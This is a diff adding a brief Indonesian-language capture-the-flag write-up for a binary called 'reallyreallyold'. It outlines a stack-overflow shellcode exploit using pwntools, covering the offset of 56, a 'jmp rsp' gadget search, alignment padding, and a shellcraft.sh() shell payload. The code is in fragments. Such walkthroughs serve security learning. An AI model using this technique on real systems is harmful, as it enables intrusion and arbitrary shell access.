@@ -1,0 +1,17 @@
+
+
+ini kerentana shellcode, pertama kita cari offset nya, didapatkan 56
+kemudian kita cari jmp rsp nya, kita langsung gunakan script untuk mencarinya
+jmp_rsp = (elf.search(asm"jmp rsp"))
+
+kemudian kita beri offset 16 karakter untuk ngisi stack allignmentnya
+
+kemudian kita tambahkan shellcode, kita ambil sh nya
+shellcode = asm(shellcraft.sh())
+kemudian jalankan script solv.py
+
+kode ini adalah kode untuk membaca informasi file exec dan merubah mode menjadi debug
+
+exe = './reallyreallyold'
+elf = context.binary = ELF(exe,checksec=False)
+context.log_level='debug'
